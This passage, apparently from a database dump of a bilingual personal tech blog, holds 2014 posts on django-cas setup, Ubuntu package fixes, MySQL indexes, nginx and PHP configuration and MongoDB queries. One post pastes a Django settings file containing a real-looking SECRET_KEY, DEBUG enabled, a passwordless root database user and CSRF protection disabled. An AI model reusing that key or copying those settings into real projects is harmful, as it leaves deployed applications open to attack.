/>CAS 2.0 functionality.)</p>\r\n<p>Now add it to the middleware and authentication backends in your settings.<br />Make sure you also have the authentication middleware installed. Here\'s what<br />mine looks like:</p>\r\n<p>{{{<br />MIDDLEWARE_CLASSES = (<br />    \'django.middleware.common.CommonMiddleware\',<br />    \'django.contrib.sessions.middleware.SessionMiddleware\',<br />    \'django.contrib.auth.middleware.AuthenticationMiddleware\',<br />    \'django_cas.middleware.CASMiddleware\',<br />    \'django.middleware.doc.XViewMiddleware\',<br />)</p>\r\n<p>AUTHENTICATION_BACKENDS = (<br />    \'django.contrib.auth.backends.ModelBackend\',<br />    \'django_cas.backends.CASBackend\',<br />)<br />}}}</p>\r\n<p>Set the following required setting in `settings.py`:</p>\r\n<p>    * `CAS_SERVER_URL`: This is the only setting you must explicitly define.<br />      Set it to the base URL of your CAS source (e.g.<br />      http://sso.some.edu/cas/).</p>\r\n<p> your settings.py: </p>\r\n<pre># tv_cms/settings.py\r\nsg552@youku:/sg552/workspace/m-tv-box-ms$ cat tv_cms/tv_cms/settings.py\r\n# Django settings for tv_cms project.\r\n\r\nimport os\r\nDEBUG = True\r\nTEMPLATE_DEBUG = DEBUG\r\nPROJECT_DIR = os.path.sep.join(os.path.realpath(__file__).split(os.path.sep)[:-2])\r\n\r\nADMINS = (\r\n    (\'Siwei\', \'shensiwei@youku.com\'),\r\n)\r\n\r\nMANAGERS = ADMINS\r\n\r\nDATABASES = {\r\n    \'default\': {\r\n        \'ENGINE\': \'django.db.backends.mysql\', # Add \'postgresql_psycopg2\', \'mysql\', \'sqlite3\' or \'oracle\'.\r\n        \'NAME\': \'m_tv_box_ms\',                      # Or path to database file if using sqlite3.\r\n        # The following settings are not used with sqlite3:\r\n        \'USER\': \'root\',\r\n        \'PASSWORD\': \'\',\r\n        \'HOST\': \'localhost\',                      # Empty for localhost through domain sockets or \'127.0.0.1\' for localhost through TCP.\r\n        \'PORT\': \'\',                      # Set to empty string for default.\r\n    }\r\n}\r\n\r\n# Hosts/domain names that are valid for this site; required if DEBUG is False\r\n# See https://docs.djangoproject.com/en/1.5/ref/settings/#allowed-hosts\r\nALLOWED_HOSTS = []\r\n\r\n# Local time zone for this installation. Choices can be found here:\r\n# http://en.wikipedia.org/wiki/List_of_tz_zones_by_name\r\n# although not all choices may be available on all operating systems.\r\n# In a Windows environment this must be set to your system time zone.\r\nTIME_ZONE = \'Asia/Shanghai\'\r\n\r\n# Language code for this installation. All choices can be found here:\r\n# http://www.i18nguy.com/unicode/language-identifiers.html\r\nLANGUAGE_CODE = \'en-us\'\r\n\r\nSITE_ID = 1\r\n\r\n# If you set this to False, Django will make some optimizations so as not\r\n# to load the internationalization machinery.\r\nUSE_I18N = True\r\n\r\n# If you set this to False, Django will not format dates, numbers and\r\n# calendars according to the current locale.\r\nUSE_L10N = True\r\n\r\n# If you set this to False, Django will not use timezone-aware datetimes.\r\nUSE_TZ = True\r\n\r\n# Absolute filesystem path to the directory that will hold user-uploaded files.\r\n# Example: \"/var/www/example.com/media/\"\r\nMEDIA_ROOT = \'\'\r\n\r\n# URL that handles the media served from MEDIA_ROOT. Make sure to use a\r\n# trailing slash.\r\n# Examples: \"http://example.com/media/\", \"http://media.example.com/\"\r\nMEDIA_URL = \'\'\r\n\r\n# Absolute path to the directory static files should be collected to.\r\n# Don\'t put anything in this directory yourself; store your static files\r\n# in apps\' \"static/\" subdirectories and in STATICFILES_DIRS.\r\n# Example: \"/var/www/example.com/static/\"\r\nSTATIC_ROOT = \'\'\r\n\r\n# URL prefix for static files.\r\n# Example: \"http://example.com/static/\", \"http://static.example.com/\"\r\nSTATIC_URL = \'/statics/\'\r\n\r\n# Additional locations of static files\r\nSTATICFILES_DIRS = (\r\n    # Put strings here, like \"/home/html/static\" or \"C:/www/django/static\".\r\n    # Always use forward slashes, even on Windows.\r\n    # Don\'t forget to use absolute paths, not relative paths.\r\n    PROJECT_DIR +STATIC_URL,\r\n)\r\n\r\n# List of finder classes that know how to find static files in\r\n# various locations.\r\nSTATICFILES_FINDERS = (\r\n    \'django.contrib.staticfiles.finders.FileSystemFinder\',\r\n    \'django.contrib.staticfiles.finders.AppDirectoriesFinder\',\r\n#    \'django.contrib.staticfiles.finders.DefaultStorageFinder\',\r\n)\r\n\r\n# Make this unique, and don\'t share it with anybody.\r\nSECRET_KEY = \'#jl(@ux!rshzu34uq^8mz9o#ea0ybiy0g==z&amp;mfrk#5#u#y9d=\'\r\n\r\n# List of callables that know how to import templates from various sources.\r\nTEMPLATE_LOADERS = (\r\n    \'django.template.loaders.filesystem.Loader\',\r\n    \'django.template.loaders.app_directories.Loader\',\r\n#     \'django.template.loaders.eggs.Loader\',\r\n)\r\n\r\nMIDDLEWARE_CLASSES = (\r\n    \'django.middleware.common.CommonMiddleware\',\r\n    \'django.contrib.sessions.middleware.SessionMiddleware\',\r\n    # \'django.middleware.csrf.CsrfViewMiddleware\',\r\n    \'django.contrib.auth.middleware.AuthenticationMiddleware\',\r\n    \'django_cas.middleware.CASMiddleware\',\r\n    \'django.contrib.messages.middleware.MessageMiddleware\',\r\n    # Uncomment the next line for simple clickjacking protection:\r\n    # \'django.middleware.clickjacking.XFrameOptionsMiddleware\',\r\n    \'django.middleware.doc.XViewMiddleware\',\r\n)\r\n\r\nROOT_URLCONF = \'tv_cms.urls\'\r\n\r\n# Python dotted path to the WSGI application used by Django\'s runserver.\r\nWSGI_APPLICATION = \'tv_cms.wsgi.application\'\r\n\r\nTEMPLATE_DIRS = (\r\n    # Put strings here, like \"/home/html/django_templates\" or \"C:/www/django/templates\".\r\n    # Always use forward slashes, even on Windows.\r\n    # Don\'t forget to use absolute paths, not relative paths.\r\n    \'templates\',\r\n)\r\n\r\nINSTALLED_APPS = (\r\n    \'django.contrib.auth\',\r\n    \'django.contrib.contenttypes\',\r\n    \'django.contrib.sessions\',\r\n    \'django.contrib.sites\',\r\n    \'django.contrib.messages\',\r\n    \'django.contrib.staticfiles\',\r\n    # Uncomment the next line to enable the admin:\r\n    # \'django.contrib.admin\',\r\n    # Uncomment the next line to enable admin documentation:\r\n    # \'django.contrib.admindocs\',\r\n    \'tv_cms\',\r\n    \'interface\',\r\n    \'django_cas\',\r\n)\r\n\r\nAUTHENTICATION_BACKENDS = (\r\n    \'django.contrib.auth.backends.ModelBackend\',\r\n    \'django_cas.backends.CASBackend\',\r\n)\r\n\r\nCAS_SERVER_URL=\'http://10.103.13.121:3535/\'\r\n\r\nSESSION_SERIALIZER = \'django.contrib.sessions.serializers.JSONSerializer\'\r\n\r\n# A sample logging configuration. The only tangible logging\r\n# performed by this configuration is to send an email to\r\n# the site admins on every HTTP 500 error when DEBUG=False.\r\n# See http://docs.djangoproject.com/en/dev/topics/logging for\r\n# more details on how to customize your logging configuration.\r\nLOGGING = {\r\n    \'version\': 1,\r\n    \'disable_existing_loggers\': False,\r\n    \'filters\': {\r\n        \'require_debug_false\': {\r\n            \'()\': \'django.utils.log.RequireDebugFalse\'\r\n        }\r\n    },\r\n    \'handlers\': {\r\n        \'mail_admins\': {\r\n            \'level\': \'ERROR\',\r\n            \'filters\': [\'require_debug_false\'],\r\n            \'class\': \'django.utils.log.AdminEmailHandler\'\r\n        }\r\n    },\r\n    \'loggers\': {\r\n        \'django.request\': {\r\n            \'handlers\': [\'mail_admins\'],\r\n            \'level\': \'ERROR\',\r\n            \'propagate\': True,\r\n        },\r\n    }\r\n}\r\n \r\n</pre>',0,'2014-02-13 10:00:00','2014-02-13 10:32:50','2014-02-14 05:46:12',1,NULL,'using-django-cas','','','',796,'using-django-cas'),(213,'ubuntu13 下无法安装 python-dev 的解决办法 (problem-installing-python-dev in ubuntu 13  )','<p>昨天废了很多时间来装 django-cas, 其中就要用到 python的mysql 客户端。 解决遇到问题： &#160; ( it costs me hours to solve this problem when installing python mysql client: )</p>\r\n<pre>The following packages have unmet dependencies:\r\n python-dev : Depends: python (= 2.7.3-0ubuntu2) but 2.7.3-0ubuntu2.2 is to be installed\r\n              Depends: python2.7-dev (&gt;= 2.7.3) but it is not going to be installed\r\n</pre>\r\n<p>搜了N久，才发现了这个不错的解决办法： (apt-get install -f, 也不行。） &#160;貌似直接下载 &#160;tar.gz, 然后 make install... 忘记行不行了。。。 &#160;(after googled a lot, I found this solution)&#160;</p>\r\n<p>$ echo \"deb http://us.archive.ubuntu.com/ubuntu/ precise-updates main restricted\" | sudo tee -a /etc/apt/sources.list.d/precise-updates.list<br />$ sudo apt-get update<br />$ sudo apt-get install python2.7-dev</p>\r\n<p>原文见： (refer to <a href=\"http://askubuntu.com/questions/275861/problem-installing-python-dev\" target=\"_blank\">http://askubuntu.com/questions/275861/problem-installing-python-dev</a>)</p>',0,'2014-02-14 02:56:00','2014-02-14 03:01:04','2014-02-14 03:01:04',1,NULL,'problem-installing-python-dev-in-ubuntu13','','','',591,'problem-installing-python-dev-in-ubuntu13'),(214,'django 安装auth 模块 (install django auth) ','<p>follow this post: <a href=\"https://docs.djangoproject.com/en/1.5/topics/auth/#installation\" target=\"_blank\">https://docs.djangoproject.com/en/1.5/topics/auth/#installation</a>&#160;</p>\r\n<p>1. add these lines to file: </p>\r\n<pre># in settings.py file:\r\n122 INSTALLED_APPS = (\r\n123     \'django.contrib.auth\',\r\n124     \'django.contrib.contenttypes\',\r\n         .....\r\n\r\n 98 MIDDLEWARE_CLASSES = (\r\n 99     \'django.middleware.common.CommonMiddleware\',\r\n102     \'django.contrib.auth.middleware.AuthenticationMiddleware\',\r\n       ....\r\n\r\n</pre>\r\n<p> 2.  create database:  $ python manage.py syncdb </p>',0,'2014-02-14 06:28:00','2014-02-14 06:30:14','2014-02-14 06:32:57',1,NULL,'install-django-auth','','','',432,'install-django-auth'),(215,'mark down 的语法( mark down grammar)','refer to : <a href=\"http://guides.github.com/overviews/mastering-markdown/\" target=\"_blank\">http://guides.github.com/overviews/mastering-markdown/</a>\r\nand <a href=\"https://help.github.com/articles/github-flavored-markdown\" target=\"_blank\">https://help.github.com/articles/github-flavored-markdown</a>\r\n<p>\r\nruby code: </p> \r\n<pre>```ruby\r\nrequire \'redcarpet\'\r\nmarkdown = Redcarpet.new(\"Hello World!\")\r\nputs markdown.to_html\r\n```\r\n</pre>\r\n<p>It\'s very easy to make some words <strong>bold</strong> and other words <em>italic</em> with Markdown. You can even link to <a>Google!</a>\r\n</p>\r\n<pre>It\'s very easy to make some words **bold** and other words *italic* with Markdown. You can even [link to Google!](http://google.com).\r\n</pre>\r\n<p> headers: \r\n</p>\r\n<pre># This is an &lt;h1&gt; tag\r\n## This is an &lt;h2&gt; tag\r\n###### This is an &lt;h6&gt; tag</pre>\r\n\r\n<p>Lists and others </p>\r\n<pre>\r\n\r\nUnordered\r\n\r\n* Item 1\r\n* Item 2\r\n  * Item 2a\r\n  * Item 2b\r\nOrdered\r\n\r\n1. Item 1\r\n2. Item 2\r\n3. Item 3\r\n   * Item 3a\r\n   * Item 3b\r\nImages\r\n\r\n![GitHub Logo](/images/logo.png)\r\nFormat: ![Alt Text](url)\r\nLinks\r\n\r\nhttp://github.com - automatic!\r\n[GitHub](http://github.com)\r\nBlockquotes\r\n\r\nAs Kanye West said:\r\n\r\n&gt; We\'re living the future so\r\n&gt; the present is our past.\r\n</pre>',0,'2014-02-16 00:22:00','2014-02-16 01:23:04','2014-02-16 01:23:04',1,NULL,'markdown-grammar','','','',410,'markdown-grammar'),(216,'mysql中的index (index in mysql)','<p>refer to: <a href=\"https://dev.mysql.com/doc/refman/5.0/en/mysql-indexes.html\" target=\"_blank\">https://dev.mysql.com/doc/refman/5.0/en/mysql-indexes.html</a>,&#160;<br /><a href=\"http://database.51cto.com/art/200910/156685.htm\" target=\"_blank\" style=\"background-color: transparent;\">http://database.51cto.com/art/200910/156685.htm</a> and&#160;\r\n<a href=\"http://www.cnblogs.com/hustcat/archive/2009/10/28/1591648.html\" target=\"_blank\" style=\"background-color: transparent;\">http://www.cnblogs.com/hustcat/archive/2009/10/28/1591648.html</a>, <a href=\"http://www.php100.com/html/webkaifa/database/Mysql/2013/0316/12223.html\" target=\"_blank\">http://www.php100.com/html/webkaifa/database/Mysql/2013/0316/12223.html</a>\r\n</p>\r\n<p>项目中有个日志表，记录了用户的所有操作。前些天发现这个表比较大了， 33万行记录。每次打开都耗时很久（10秒左右）。所以需要优化一下。</p>\r\n<pre>mysql &gt; select count(*) from cms_new_logs ;  # =&gt;  259959\r\nmysql &gt; select * from cms_new_logs where user_name = \'shensiwei@youku.com\';  # =&gt; 1.11s \r\nmysql &gt; create index index_for_username on cms_new_logs( user_name ( 25 )); # =&gt; 60.33s\r\nmysql &gt; select * from cms_new_logs where user_name = \'shensiwei@youku.com\';  # =&gt; 0.66s \r\nmysql &gt; select * from cms_new_logs where user_name = \'shensiwei@youku.com\';  # =&gt; 0.12s \r\n</pre>\r\n\r\n<p>使用索引时，有以下一些技巧和注意事项：</p>\r\n<p>◆索引不会包含有NULL值的列</p>\r\n<p>只要列中包含有NULL值都将不会被包含在索引中，复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。所以我们在数据库设计时不要让字段的默认值为NULL。</p>\r\n<p>◆使用短索引</p>\r\n<p>对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个CHAR(255)的列，如果在前10个或20个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。</p>\r\n<p>◆索引列排序</p>\r\n<p>MySQL查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作；尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。</p>\r\n<p>◆like语句操作</p>\r\n<p>一般情况下不鼓励使用like操作，如果非使用不可，如何使用也是一个问题。like “%aaa%” 不会使用索引，而like “aaa%”可以使用索引。</p>\r\n<p>◆不要在列上进行运算</p>\r\n<p>select * from users where YEAR(adddate)&lt;2007; 将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成</p>\r\n<p>select * from users where adddate&lt;‘2007-01-01’; </p>\r\n<p>◆不使用NOT IN和&lt;&gt;操作\r\n</p>\r\n',0,'2014-02-17 02:43:00','2014-02-17 02:53:32','2014-02-17 03:21:00',1,NULL,'index-in-mysql','','','',418,'index-in-mysql'),(217,'git log show exact date','<p>git log --pretty=format:\"%H %an %ad\"</p>',0,'2014-02-20 06:41:00','2014-02-20 06:42:26','2014-02-20 06:42:26',1,NULL,'git-log-show-exact-date','','','',471,'git-log-show-exact-date'),(218,'php: curl init not found','<p>in ubuntu, you need to install php5-curl:</p>\r\n<p>$&#160;aptitude install php5-curl</p>\r\n<p>$&#160;/etc/init.d/php5-fpm restart &#160; # remember to do this</p>',0,'2014-02-20 11:40:00','2014-02-20 11:41:33','2014-02-20 11:45:15',1,NULL,'curl-init-not-found','','','',415,'curl-init-not-found'),(219,'php:  Call to undefined function: imagecreate()  ','<p>solution is quit simple:&#160;</p>\r\n<p>refer to: &#160;http://www.php.net/manual/en/image.installation.php</p>\r\n<div><p>$ sudo apt-get install php5-gd</p>\r\n</div>',0,'2014-02-20 11:59:00','2014-02-20 12:01:36','2014-02-20 12:01:36',1,NULL,'php-error-imagecreate','','','',579,'php-error-imagecreate'),(220,'动态web页面 的速度跟nginx服务下的静态页面的支持速度，天壤之别啊。 (dynamic pages is so slow comparing to static pages served by nginx)','<p>今天心血来潮，比较了一下静态服务器和动态WEB服务器，在同样并发下的相应速度。 前者是后者速度的50倍。 \r\n在我的机器上轻松支撑到 15K req/s, 而 使用了cache的 rails : 300 req/s.  哎。。。 (in short: nginx serving static page is 50 faster then rails server using cache)</p>\r\n<p>thin: &#160;</p>\r\n<pre>Concurrency Level:      1000\r\nTime taken for tests:   3.068 seconds\r\nComplete requests:      1000\r\nFailed requests:        0\r\nWrite errors:           0\r\nTotal transferred:      574000 bytes\r\nHTML transferred:       311000 bytes\r\nRequests per second:    325.98 [#/sec] (mean)\r\nTime per request:       3067.652 [ms] (mean)\r\nTime per request:       3.068 [ms] (mean, across all concurrent requests)\r\nTransfer rate:          182.73 [Kbytes/sec] received\r\n\r\n</pre>\r\n<p>nginx:</p>\r\n<pre>Concurrency Level:      1000\r\nTime taken for tests:   0.068 seconds\r\nComplete requests:      1000\r\nFailed requests:        1000\r\n   (Connect: 0, Receive: 0, Length: 766, Exceptions: 234)\r\nWrite errors:           0\r\nNon-2xx responses:      481\r\nTotal transferred:      415286 bytes\r\nHTML transferred:       271101 bytes\r\nRequests per second:    14735.35 [#/sec] (mean)\r\nTime per request:       67.864 [ms] (mean)\r\nTime per request:       0.068 [ms] (mean, across all concurrent requests)\r\nTransfer rate:          5975.96 [Kbytes/sec] received\r\n\r\n</pre>',0,'2014-02-23 07:31:00','2014-02-23 07:36:43','2014-02-23 07:36:43',1,NULL,'dynamic-page-and-static-page-comparison','','','',445,'dynamic-page-and-static-page-comparison'),(221,'接口系统对于异常的处理 (exceptions in web interface design)','<p>目前对于异常有两种处理： (there\'re 2 ways for exception process )&#160;</p>\r\n<p>1. 不处理。 直接抛出。让客户能看到，方便开发人员的处理。 典型的是使用exception_notification 这样的插件， 遇到异常，直接给开发人员邮件。 &#160;( just throw it so that developers could find what is happening very easily. in Rails 3, we use a rubygem named \'exception notification\' )&#160;</p>\r\n<p>2. 处理这个异常。把它进行 begin... rescue (ruby ) 或者 try...catch (java) 这样的处理。 但是要记得把错误记录在日志中。 &#160; ( in ruby, we use begin/rescue and in java: try/catch block to make sure there\'s no error when exception thrown. but remember to log the errors into file )&#160;</p>\r\n<p>方案1 适合低访问量的网站。 &#160;因为优酷的访问量非常大，目前是每秒100个请求，所以一旦出错，每秒就发送x个邮件。对系统的资源影响很大。 所以第二个方案在这个情况下就特别合适了。 &#160;( plan 1 fits the websites that don\'t have huge visitors, because when exception thrown, the server would send many many emails per second which costs heavy system resources. so plan 2 is our choice , especially in youku.com, we have at least 100 req/s. &#160;)&#160;</p>\r\n<p>如果一旦使用了方案2， 要记得给出假数据。 &#160;保证客户端有内容可以取到。&#160;</p>',0,'2014-02-28 02:05:00','2014-02-28 02:13:40','2014-02-28 02:13:40',1,NULL,'exceptions-in-webservice-design','','','',417,'exceptions-in-webservice-design'),(222,'setup php environment on bare ubuntu(在ubuntu上搭建php环境）','<p>UBUNTU 10：&#160;<br />参考：(refer to : <a href=\"https://gist.github.com/DaRaFF/3995789\">https://gist.github.com/DaRaFF/3995789</a>)<br />PHP官方的文档简直没有可读性，摸索了一天，归纳出来了：&#160;</p>\r\n<pre>$ sudo apt-get install libapr1-dev libxml2-dev  libxslt-dev mysql-server libmysqlclient-dev\r\n curl build-essential libssl-dev libreadline-dev libopenssl-ruby build-essential \r\n libssl-dev libreadline-dev vim git-core\r\n</pre>\r\n<pre>$aptitude install php5-cgi php5-mysql php5-fpm php5-curl php5-gd php5-idn php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-mhash php5-ming php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl php5-fpm\r\n\r\n$ sudo apt-get install php5-cli php5-common php-apc php-pear php5-xdebug php5-curl php5 php5-dev\r\nsudo apt-get install php5-xsl\r\nsudo apt-get install php5-intl\r\n$ sudo apt-get install gcc g++ libpcre++-dev zlib1g-dev make&#160;\r\n$ apt-get install nginx php5-fpm php5  （这一步很关键）\r\n$ apt-get install graphicsmagick libgraphicsmagick1-dev\r\n\r\n</pre>\r\n<p>修改配置文件： （这一步也很关键 this is the key! )</p>\r\n<pre># \r\n#edit listen port in /etc/php5/fpm/pool.d/www.conf\r\n 32 ; Note: This value is mandatory.\r\n 33 ;listen = 127.0.0.1:9009\r\n 34 listen = /var/run/php5-fpm.sock\r\n\r\n# nginx server config\r\n  server {\r\n    listen       80; \r\n    server_name  www.weixin.pe weixin.pe;\r\n    charset utf-8;\r\n    root /opt/weixin_cms/upload;\r\n    index index.html index.htm index.php;\r\n    location / { \r\n      try_files $uri $uri/ /index.php;\r\n    }   \r\n    location ~ \\.php$ {\r\n      try_files $uri =404;\r\n      fastcgi_pass unix:/var/run/php5-fpm.sock;\r\n      fastcgi_index index.php;\r\n      fastcgi_param SCRIPT_FILENAME html$fastcgi_script_name;\r\n      include fastcgi_params;\r\n    }   \r\n  }\r\n\r\n\r\n</pre>\r\n\r\n<p>then comes to setup the DB and PHP config:&#160;</p>\r\n<p>1.&#160;create database weixin_cms default charset utf8 COLLATE utf8_general_ci;</p>\r\n<p>2. use weixin_cms;</p>\r\n<p>3. source pigcms.sql;</p>\r\n<p>4.然后修改conf目录下的db.php数据库连接文件即可完成安装 ( access www.weixin.pe will show the result page)</p>',0,'2014-03-05 10:48:00','2014-03-05 10:50:05','2014-03-06 12:14:29',1,NULL,'setup-php-env-on-bare-ubuntu','','','',1011,'setup-php-env-on-bare-ubuntu'),(223,'apache + php 环境 ','<p>非常简单：</p>\r\n<pre>   apt-get install apache2\r\n   apt-get install libapache2-mod-php5\r\n</pre>',0,'2014-03-08 06:28:00','2014-03-08 06:29:51','2014-03-08 06:29:51',1,NULL,'apache-with-php','','','',367,'apache-with-php'),(224,'设置 手机访问新浪邮箱 ( access my sina email via phone)','<p>1. set the pop3/stmp: &#160;pop.sina.com &#160; smtp.sina.com, using the default port. &#160;( notice: it\'s pop.sina.com, but not pop3.sina.com )&#160;</p>\r\n<p>2. input username/password.</p>\r\n<p>done.&#160;</p>',0,'2014-03-09 01:12:00','2014-03-09 01:16:30','2014-03-09 01:16:30',1,NULL,'access-sina-mail-via-phone','','','',4633,'access-sina-mail-via-phone'),(225,'delete mongodb data by date(根据日期来查询/删除mongodb ) ','<p>mongoDB 操作起来不是很直观啊。 例如，</p>\r\n\r\n<pre># 查询 2014年4月24日之后建立的数据：  (find them) \r\nstart = new Date(2014,3,25);\r\ndb.logs.find({created_at: { $gt: start}}).count()  # =&gt;   1254450\r\n# 删除 它们  (remove them) \r\ndb.logs.remove({created_at: { $lt: start}});\r\n</pre>\r\n',0,'2014-03-11 05:56:00','2014-03-11 06:06:47','2014-04-28 05:55:17',1,NULL,'delete-mongodb-data-by-date','','','',484,'delete-mongodb-data-by-date'),(226,'显示某个目录的结构 ( show folder structures ) ','<p>显示某个目录的结构</p>\r\n<p>$ find ./ -type d &#160;</p>\r\n<p>$ tree -d /opt/files</p>\r\n<p>	see: <a href=\"http://stackoverflow.com/questions/3455625/linux-command-to-print-directory-structure-in-the-form-of-a-tree\" target=\"_blank\">http://stackoverflow.com/questions/3455625/linux-command-to-print-directory-structure-in-the-form-of-a-tree</a>\r\n</p>',0,'2014-03-12 02:39:00','2014-03-12 02:41:41','2014-03-12 02:41:41',1,NULL,'show-folder-structure','','','',438,'show-folder-structure'),(227,'我们就差一个写代码的了。( everything is ready, except a coder) ','<p>知乎是一个中文问答社区，虽然stackoverflow已经非常强大了，但是知乎所具有的中国特色仍然具有强大的生命力。</p>\r\n<p>今天看到的这个文章非常有意思：<a href=\"http://www.zhihu.com/question/22989105\" target=\"_blank\">http://www.zhihu.com/question/22989105</a>\r\n</p>\r\n<p>引用几句有意思的话:</p>\r\n<p>-- 酱油和醋都准备好了，就差你带点儿饺子过来了！</p>\r\n<p>-- google的搜索框看起来那么简单，半小时能不能搞好？</p>',0,'2014-03-15 08:34:00','2014-03-15 08:38:22','2014-03-15 08:39:30',1,NULL,'everything-is-ready-except-a-coder','','','',547,'everything-is-ready-except-a-coder'),(228,'nginx built-in variables (nginx 内置的变量)','<p>Nginx 这些变量非常有用， refer to: <a href=\"http://wiki.nginx.org/HttpCoreModule#.24args\" target=\"_blank\">http://wiki.nginx.org/HttpCoreModule#.24args</a>\r\n</p><p>The core module supports built-in variables, whose names correspond with the names of variables in Apache.</p>\r\n<p>First of all, there are variables which represent header lines in the client request, for example, $http_user_agent, $http_cookie, and so forth. Note that because these correspond to what the client actually sends, they are not guaranteed to exist and their meaning is defined elsewhere (e.g. in relevant standards).</p>\r\n<p>Furthermore, there are other variables:</p>\r\n<p>$arg_PARAMETER<br />This variable contains the value of the GET request variable PARAMETER if present in the query string</p>\r\n<p>$args<br />This variable is the GET parameters in request line, e.g. foo=123&amp;bar=blahblah; This variable could be changed.</p>\r\n<p>$binary_remote_addr<br />The address of the client in binary form;</p>\r\n<p>$body_bytes_sent<br />The amount of bytes sent as part of the body of the response. Is accurate even when connections are aborted or interrupted.</p>\r\n<p>$content_length<br />This variable is equal to line Content-Length in the header of request;</p>\r\n<p>$content_type<br />This variable is equal to line Content-Type in the header of request;</p>\r\n<p>$cookie_COOKIE<br />The value of the cookie COOKIE;</p>\r\n<p>$document_root<br />This variable is equal to the value of directive root for the current request;</p>\r\n<p>$document_uri<br />The same as $uri.</p>\r\n<p>$host<br />This variable is equal to line Host in the header of request or name of the server processing the request if the Host header is not available.</p>\r\n<p>This variable may have a different value from $http_host in such cases: 1) when the Host input header is absent or has an empty value, $host equals to the value of server_name directive; 2)when the value of Host contains port number, $host doesn\'t include that port number. $host\'s value is always lowercase since 0.8.17.</p>\r\n<p>$hostname<br />Set to the machine\'s hostname as returned by gethostname</p>\r\n<p>$http_HEADER<br />The value of the HTTP request header HEADER when converted to lowercase and with \'dashes\' converted to \'underscores\', e.g. $http_user_agent, $http_referer...;</p>\r\n<p>$is_args<br />Evaluates to \"?\" if $args is set, \"\" otherwise.</p>\r\n<p>$limit_rate<br />This variable allows limiting the connection rate.</p>\r\n<p>$nginx_version<br />The version of Nginx that the server is currently running;</p>\r\n<p>$query_string<br />The same as $args except that this variable is readonly.</p>\r\n<p>$remote_addr<br />The address of the client.</p>\r\n<p>$remote_port<br />The port of the client;</p>\r\n<p>$remote_user<br />This variable is equal to the name of user, authenticated by the Auth Basic Module;</p>\r\n<p>$request_filename<br />This variable is equal to path to the file for the current request, formed from directives root or alias and URI request;</p>\r\n<p>$request_body<br />This variable(0.7.58+) contains the body of the request. The significance of this variable appears in locations with directives proxy_pass or fastcgi_pass.</p>\r\n<p>$request_body_file<br />Client request body temporary filename;</p>\r\n<p>$request_completion<br />Set to \"OK\" if request was completed successfully. Empty if request was not completed or if request was not the last part of a series of range requests.</p>\r\n<p>$request_method<br />This variable is equal to the method of request, usually GET or POST.</p>\r\n<p>This variable always evaluates to the method name of the main request, not the current request, when the current request is a subrequest.</p>\r\n<p>$request_uri<br />This variable is equal to the *original* request URI as received from the client including the args. It cannot be modified. Look at $uri for the post-rewrite/altered URI. Does not include host name. Example: \"/foo/bar.php?arg=baz\"</p>\r\n<p>$scheme<br />The HTTP scheme (i.e. http, https). Evaluated only on demand, for example:</p>\r\n<p>rewrite  ^  $scheme://example.com$uri  redirect;<br />$sent_http_HEADER<br />The value of the HTTP response header HEADER when converted to lowercase and with \'dashes\' converted to \'underscores\', e.g. $sent_http_cache_control, $sent_http_content_type... .</p>\r\n<p>$server_addr<br />The server address. Generally nginx makes a system call to obtain this value. To improve efficiency and avoid this system call, specify an address with the listen directive and to use the bind parameter.</p>\r\n<p>$server_name<br />The name of the server.</p>\r\n<p>$server_port<br />This variable is equal to the port of the server, to which the request arrived;</p>\r\n<p>$server_protocol<br />This variable is the protocol of the request. Common examples are: HTTP/1.0 or HTTP/1.1</p>\r\n<p>$uri<br />This variable is the current request URI, without any arguments (see $args for those). This variable will reflect any modifications done so far by internal redirects or the index module. Note this may be different from $request_uri, as $request_uri is what was originally sent by the browser before any such modifications. Does not include the protocol or host name. Example: /foo/bar.html</p>',0,'2014-03-15 09:25:00','2014-03-15 09:27:39','2014-03-15 09:27:39',1,NULL,'nginx-built-in-variables','','','',1094,'nginx-built-in-variables'),(229,'nginx rewrite/try_file tips(nginx rewrite/try_files 小提示）','<p>refer to: <a href=\"http://stackoverflow.com/questions/22032751/how-to-process-dynamic-urls-as-static-pages-using-nginx\" target=\"_blank\">http://stackoverflow.com/questions/22032751/how-to-process-dynamic-urls-as-static-pages-using-nginx</a> </p>\r\n<p>最近，一个项目的请求让我们的Rails不足以负担（300 req /seconds是我们的极限），所以我打算把它做成静态化的页面，这样在我的 2核CPU上都可以轻松跑到15000 req/s. &#160;( recently I am considering migrate our dynamic rails pages to static files served by Nginx which is much powerful than rails- 15k req/s v.s. 300 req/s. )</p>\r\n<p>于是我们的nginx 配置文件是： ( so our nginx config file looks like: )</p>\r\n<pre>  server {\r\n    listen       100;\r\n    charset utf-8;\r\n    root /workspace/test_static_files;\r\n    index index.html index.htm;\r\n    location /popup_pages {\r\n      log_subrequest on; \r\n      try_files /platform-$arg_platform-product-$arg_product.json /default.json;\r\n#  DON\'T use like below, nginx could not process underscore filenames mixing up with $arg_parameter_name:\r\n#      try_files /platform_$arg_platform_product_$arg_product.json /default.json?q=$uri;\r\n#      don\'t use rewrite ...  use try_files instead. \r\n#      rewrite ^/popup_pages /platform-$arg_platform-product-$arg_product.json;\r\n    }   \r\n  }\r\n\r\n</pre>\r\n<p>几个小tips: (some tips) </p>\r\n<p>1. 不要使用下划线。 因为nginx无法正确判断 $arg_param 中的变量。 要使用横线\'-\'   (use \'-\' instead of underscore \'_\' in your static file names) \r\n</p>\r\n<pre>#      DON\'T use like below, nginx could not process underscore filenames mixing up with $arg_parameter_name:\r\n#      try_files /platform_$arg_platform_product_$arg_product.json /default.json?q=$uri;\r\n</pre>\r\n<p>2. 尽量不要使用rewrite ，因为if is Evil ( If is evil, see: <a href=\"http://wiki.nginx.org/IfIsEvil\" target=\"_blank\">http://wiki.nginx.org/IfIsEvil</a> ) </p>\r\n<pre>#      Don\'t use rewrite ...  use try_files instead. \r\n#      rewrite ^/popup_pages /platform-$arg_platform-product-$arg_product.json;\r\n</pre>\r\n<p> 3. 调试时，可以先使用 rewrite 来调试，调试完毕后，把它改写成 try_files. 调试rewrite 时，时刻关注access.log/error.log 